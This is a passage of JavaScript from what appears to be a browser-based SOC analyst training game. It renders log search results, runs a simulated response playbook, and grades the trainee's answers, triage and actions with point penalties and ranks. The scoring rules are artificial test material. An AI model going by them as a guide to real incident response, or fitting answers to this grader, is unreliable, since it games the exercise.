 try{LAST=runQuery(S.query,S.events);out.innerHTML=renderResult(LAST)}catch(e){out.innerHTML=`<div class="card err">Query error: ${esc(e.message)}</div>`}}
function renderResult(r){if(r.kind==='table'){const cols=r.cols;return `<div class="card"><div class="small muted">${r.rows.length} row(s)</div><div style="overflow-x:auto"><table><tr>${cols.map(c=>`<th>${esc((r.label&&r.label[c])||c)}</th>`).join('')}</tr>${r.rows.slice(0,LIMIT).map(row=>`<tr>${cols.map(c=>`<td>${esc(fmtV(c,row[c]))}</td>`).join('')}</tr>`).join('')}</table></div>${r.rows.length>LIMIT?`<button class="btn sm" style="margin-top:8px" onclick="LIMIT+=100;$('#res').innerHTML=renderResult(LAST)">Show more</button>`:''}</div>`}
 const ev=r.rows,b=new Array(12).fill(0);ev.forEach(e=>{const k=Math.min(11,Math.max(0,Math.floor((e._time-BASE)/600000)));b[k]++});const mx=Math.max(1,...b);
 FV=[];const FIELDS=['sourcetype','host','user','src_ip','dest_ip','dest_port','action','event','uri','status','user_agent','scheme','domain','query','process','parent','sender','category','country'];
 const fields=FIELDS.map(f=>{const c={};ev.forEach(e=>{if(e[f]!=null)c[e[f]]=(c[e[f]]||0)+1});const top=Object.entries(c).sort((a,b)=>b[1]-a[1]).slice(0,6);return top.length?`<details><summary>${f} (${Object.keys(c).length})</summary>${top.map(([v,n])=>{FV.push([f,v]);return `<div class="fv" onclick="addF(${FV.length-1})"><span>${esc(v)}</span><span class="muted">${n}</span></div>`}).join('')}</details>`:''}).join('');
 return `<div class="card"><div class="small muted">${ev.length} event(s) · 09:00–11:00</div><div class="hist">${b.map(n=>`<div style="height:${n/mx*100}%" title="${n}"></div>`).join('')}</div><div class="histl"><span>09:00</span><span>10:00</span><span>11:00</span></div></div>
 <div class="grid side"><details class="card fields" ${innerWidth>820?'open':''}><summary><b style="color:var(--accent)">Fields</b> <span class="small muted">tap a value to filter</span></summary>${fields||'<span class="muted small">—</span>'}</details><div class="card">${ev.slice(0,LIMIT).map(evRow).join('')||'<span class="muted">No matching events.</span>'}${ev.length>LIMIT?`<button class="btn sm" style="margin-top:8px" onclick="LIMIT+=100;$('#res').innerHTML=renderResult(LAST)">Show more (${ev.length-LIMIT} left)</button>`:''}</div></div>`}
function evRow(e){const ks=Object.keys(e).filter(k=>k[0]!=='_'&&k!=='sourcetype');return `<details class="ev"><summary><span class="t">${fmtT(e._time)}</span> <span class="st st-${e.sourcetype}">${e.sourcetype}</span> ${ks.slice(0,6).map(k=>`<span class="kv"><b>${k}</b>=${esc(fmtV(k,e[k]))}</span>`).join(' ')}</summary><div class="full">${ks.map(k=>`<div><b style="color:#9fb3d9">${k}</b> = ${esc(fmtV(k,e[k]))}</div>`).join('')}</div></details>`}
function addF(i){const[f,v]=FV[i];const q=$('#q');const parts=q.value.split('|');parts[0]=(parts[0].trim()+` ${f}="${v}"`).trim()+' ';q.value=parts.join('|').trim();doSearch()}
function investigate(i){const a=S.alerts[i];S.query=(a.rule.q.split('|')[0].trim()+' '+Object.entries(a.by).map(([k,v])=>`${k}="${v}"`).join(' ')).trim();show('search')}
function triage(i,v){const a=S.alerts[i];S.triage[a.id]=S.triage[a.id]===v?undefined:v;updateStatus();render()}
function testRule(){const q=$('#rq').value;try{const r=runQuery(q,S.events);$('#rt').textContent=`→ would create ${r.kind==='table'?r.rows.length:(r.rows.length?1:0)} alert(s)`}catch(e){$('#rt').textContent='Error: '+e.message}}
function addRule(){const n=$('#rn').value.trim()||'Custom rule',q=$('#rq').value.trim();if(!q){$('#rt').textContent='Enter a query';return}try{runQuery(q,S.events)}catch(e){$('#rt').textContent='Error: '+e.message;return}
 S.rules.push({id:'C'+Date.now(),name:n,sev:$('#rs').value,q,on:true,builtin:false});runDetections(true);render()}
function mv(i,d){const j=i+d;if(j<0||j>=S.steps.length)return;[S.steps[i],S.steps[j]]=[S.steps[j],S.steps[i]];render()}
function loadTpl(){const k=$('#tpl').value;if(!k)return;S.steps=TEMPLATES[k].map(a=>({a,p:''}));render()}
function runPlaybook(){const steps=S.steps.filter(s=>s.a);if(!steps.length)return;const btn=$('#runbtn');btn.disabled=true;
 const ts=()=>fmtT(BASE+7200000+(Date.now()-S.started));S.log.push(`<span class="info">[${ts()}] ▶ Playbook started (${steps.length} steps)</span>`);paintLog();
 let i=0;(function next(){if(i>=steps.length){S.log.push(`<span class="info">[${ts()}] ■ Playbook finished</span>`);paintLog();setTimeout(()=>{if(TAB==='soar')render()},300);return}
  const s=steps[i++];const[cls,msg]=execAction(s.a,s.p);S.log.push(`[${ts()}] ${esc(ACTIONS[s.a].label)} (${esc(s.p||'—')})\n<span class="${cls}">${esc(msg)}</span>`);
  if(cls!=='bad')S.executed.push({a:s.a,p:s.p.trim()});paintLog();setTimeout(next,450)})()}
function paintLog(){const t=$('#term');if(t){t.innerHTML=S.log.join('\n');t.scrollTop=t.scrollHeight}}

/* ============ grading ============ */
function reportMulti(){const single=S.incs.length===1,un=S.alerts.filter(a=>!S.triage[a.id]).length,ucl=S.alerts.filter(a=>S.triage[a.id]==='TP'&&!S.cls[a.id]).length;
 return `<div class="card"><h2>Shift report — ${esc(S.sc.name)}</h2><p class="small muted">${esc(S.sc.brief)}</p>
 <p>${S.alerts.length} alerts · <b style="color:${un?'var(--warn)':'var(--ok)'}">${un} untriaged</b> · <b style="color:${ucl?'var(--warn)':'var(--ok)'}">${ucl} true positives not classified</b> · ${S.executed.length} response actions taken</p>
 ${un||ucl?`<button class="btn sm" onclick="show('alerts')">Go to alerts</button>`:''}</div>
 ${single?`<div class="card"><h2>Investigation questions</h2>${S.incs[0].g.questions.map((q,j)=>`<label class="small">${esc(q.q)}</label><input class="mono" style="margin:4px 0 10px" value="${esc(S.answers['0_'+j]||'')}" oninput="S.answers['0_${j}']=this.value">`).join('')}</div>
 <div class="card"><h2>Hints <span class="small muted">(−5 points each)</span></h2>${S.incs[0].g.hints.slice(0,S.hints).map(h=>`<div class="hint">💡 ${esc(h)}</div>`).join('')}${S.hints<S.incs[0].g.hints.length?`<button class="btn sm" onclick="S.hints++;render()">Reveal hint ${S.hints+1}/${S.incs[0].g.hints.length}</button>`:''}</div>`:''}
 <div class="card"><label class="small">Analyst notes (not scored — practise writing a shift handover)</label><textarea oninput="S.notes=this.value" placeholder="Per incident: what happened, evidence, actions taken, follow-ups…">${esc(S.notes)}</textarea>
 <button class="btn pri" style="margin-top:10px" onclick="submitReport()">Submit &amp; get score</button></div>`}
function checkQ(q,a){a=(a||'').trim();if(q.num!=null)return Math.abs(parseFloat(a)-q.num)<=q.tol;if(q.time!=null){const m=a.match(/(\d{1,2})[:.](\d{2})/);if(!m)return false;const mins=(+m[1]-9)*60+ +m[2];return Math.abs(mins-q.time)<=2}return matchAny(a,q.a)}
function expQ(q){return q.num!=null?String(q.num):q.time!=null?fmtT(T(q.time)).slice(0,5):q.a[0]}
function gradeMulti(){const items=[];let score=0,max=0;
 const add=(ok,pts,label,detail,penalty)=>{if(penalty){score-=pts;items.push({ok:false,pts:-pts,label,detail});return}max+=pts;if(ok)score+=pts;items.push({ok,pts:ok?pts:0,max:pts,label,detail})};
 const did=(a,v)=>S.executed.some(x=>x.a===a&&matchAny(x.p,v));
 if(S.incs.length===1)S.incs[0].g.questions.forEach((q,j)=>{const a=S.answers['0_'+j]||'',ok=checkQ(q,a);add(ok,10,esc(q.q),ok?'Correct: '+esc(a):`Your answer: ${esc(a||'—')} · Expected: <b>${esc(expQ(q))}</b>`)});
 S.alerts.filter(a=>a.builtin).forEach(a=>{const exp=a.mal?'TP':'FP',got=S.triage[a.id],nm=esc(a.rule.name)+' <span class="muted">'+esc(Object.values(a.by).join(' / '))+'</span>';
  add(got===exp,5,'Triage: '+nm,`Expected <b>${exp}</b>${got?'':' · not triaged'}`);
  if(a.mal){const ty=S.incs[a.inc].def.type;add(S.cls[a.id]===ty,5,'Classify: '+nm,`Expected: <b>${esc(ty)}</b>${S.cls[a.id]&&S.cls[a.id]!==ty?' · you chose '+esc(S.cls[a.id]):''}`)}});
 S.incs.forEach(({def,g})=>{const n=esc(def.name);
  g.required.forEach(([a,v])=>add(did(a,v),10,`Required — ${n}: ${ACTIONS[a].label}`,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
  g.recommended.forEach(([a,v])=>add(did(a,v),5,`Recommended — ${n}: ${ACTIONS[a].label}`,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
  (g.forbidden||[]).forEach(([a,v])=>{if(did(a,v))add(0,15,`Harmful — ${n}: ${ACTIONS[a].label}`,'This disrupted a legitimate activity',true)})});
 const forbIPs=S.incs.flatMap(x=>(x.g.forbidden||[]).filter(f=>f[0]==='block_ip').flatMap(f=>[].concat(f[1])));
 S.executed.filter(x=>x.a==='block_ip'&&x.p.startsWith('10.')&&!forbIPs.includes(x.p)).forEach(x=>add(0,10,'Blocked internal IP '+esc(x.p),'Internal blocks can cause outages',true));
 if(S.hints)add(0,5*S.hints,`Hints used (${S.hints})`,'',true);
 score=Math.max(0,score);const pct=max?Math.round(score/max*100):0;S.result={score,max,pct,items};
 if(store[S.key]==null||pct>store[S.key]){store[S.key]=pct;saveBest()}render()}

function submitReport(){if(S.mode==='multi')return gradeMulti();const t=S.truth,items=[];let score=0,max=0;
 const add=(ok,pts,label,detail,penalty)=>{if(penalty){score-=pts;items.push({ok:false,pts:-pts,label,detail});return}max+=pts;if(ok)score+=pts;items.push({ok,pts:ok?pts:0,max:pts,label,detail})};
 t.questions.forEach(q=>{const a=(S.answers[q.id]||'').trim();const ok=q.num!=null?Math.abs(parseFloat(a)-q.num)<=q.tol:matchAny(a,q.a);add(ok,10,q.q,ok?'Correct: '+esc(a):`Your answer: ${esc(a||'—')} · Expected: <b>${esc(q.num!=null?q.num+' GB':q.a[0])}</b>`)});
 add(S.verdict===t.verdict,20,'Final verdict',`Expected: <b>${t.verdict==='TP'?'True positive':'False positive'}</b>${S.verdict?'':' (you did not choose)'}`);
 S.alerts.filter(a=>a.builtin).forEach(a=>{const exp=a.mal?'TP':'FP',got=S.triage[a.id];add(got===exp,5,'Alert triage: '+esc(a.rule.name)+' '+esc(Object.values(a.by).join(' / ')),`Expected ${exp}${got?'':' · not triaged'}`)});
 const did=(a,v)=>S.executed.some(x=>x.a===a&&matchAny(x.p,v));
 t.required.forEach(([a,v])=>add(did(a,v),10,'Required: '+ACTIONS[a].label,v==='*'?'any target':'target: '+esc([].concat(v)[0])));
 t.recommended.forEach(([a,v])=>add(did(a,v),5,'Recommended: '+ACTIONS[a].label,'target: '+esc([].concat(v)[0])));
 t.forbidden.forEach(([a,v])=>{if(did(a,v))add(0,15,'Harmful: '+ACTIONS[a].label,'This disrupted a legitimate business process',true)});
 const forbIPs=t.forbidden.filter(f=>f[0]==='block_ip').flatMap(f=>[].concat(f[1]));
 S.executed.filter(x=>x.a==='block_ip'&&x.p.startsWith('10.')&&!forbIPs.includes(x.p)).forEach(x=>add(0,10,'Blocked internal IP '+esc(x.p),'Internal blocks can cause outages',true));
 if(S.hints)add(0,5*S.hints,`Hints used (${S.hints})`,'',true);
 score=Math.max(0,score);const pct=Math.round(score/max*100);S.result={score,max,pct,items};
 if(store[S.sc.id]==null||pct>store[S.sc.id]){store[S.sc.id]=pct;saveBest()}render()}
function resultView(){const r=S.result,t=S.truth,rank=r.pct>=90?'Threat Hunter':r.pct>=75?'SOC Analyst L2':r.pct>=50?'SOC Analyst L1':'Trainee';
 return `<div class="card" style="text-align:center"><div class="muted small">${esc(S.sc.name)} · case #${S.seed%10000}</div><div class="big" style="color:${r.pct>=75?'var(--ok)':r.pct>=50?'var(--warn)':'var(--bad)'}">${r.pct}%</div><div>${r.score} / ${r.max} points · <b>${rank}</b></div>
 <div class="row" style="justify-content:center;margin-top:10px"><button class="btn" onclick="S.result=null;render()">Edit report</button><button class="btn pri" onclick="restart()">Retry (new variant)</button><button class="btn" onclick="show('missions')">Next mission</button></div></div>
 ${S.mode==='multi'?S.incs.map(({def,g})=>`<div class="card"><div class="row"><h2 class="grow" style="margin:0">${esc(def.name)}</h2><span class="sev ${def.fp?'low':'high'}">${def.fp?'False positive':'True positive'}</span></div><div style="margin:6px 0"><span class="tag" style="color:var(--accent)">${esc(def.tag)}</span> <span class="tag">${esc(def.type)}</span></div><p>${g.story}</p>${g.tags.map(m=>`<span class="tag" style="margin:2px">${esc(m)}</span>`).join(' ')}</div>`).join(''):`<div class="card"><h2>Debrief — what really happened</h2><p>${t.story}</p><h3>MITRE ATT&amp;CK</h3>${t.mitre.map(m=>`<span class="tag" style="margin:2px">${esc(m)}</span>`).join(' ')}</div>`}
 <div class="card"><h2>Breakdown</h2>${r.items.map(x=>`<div class="res-item"><span>${x.pts<0?'⚠️':x.ok?'✅':'❌'}</span><div class="grow"><div>${x.label}</div><div class="small muted">${x.detail}</div></div><span class="mono small" style="color:${x.pts<0?'var(--bad)':x.ok?'var(--ok)':'var(--muted)'}">${x.pts<0?x.pts:x.pts+'/'+x.max}</span></div>`).join('')}</div>`}

renderNav();render();
</script>
